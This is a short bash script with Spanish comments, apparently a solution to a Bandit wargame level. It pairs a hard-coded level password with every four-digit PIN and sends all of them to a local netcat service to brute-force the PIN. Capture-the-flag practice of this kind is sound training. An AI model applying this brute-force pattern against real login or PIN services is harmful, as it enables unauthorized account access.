#!/bin/bash
# Author: Gatovsky
#
# script para generar pin de 4 dígitos que serán concatenados a la clave del bandit24
# y posterirormente mandar todas las posibles combinaciones al server nc

DIR=/tmp/gatovsky24
FILE=$DIR/passpin.txt

for ((i = 0; i <= 10000; i++)); do
        printf VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar >> $FILE
        printf " %.4d\n" $i >> $FILE
done 

{ # try
	nc localhost 30002 < $FILE
} || { # catch
	echo -e "Somthing was wrong"
}

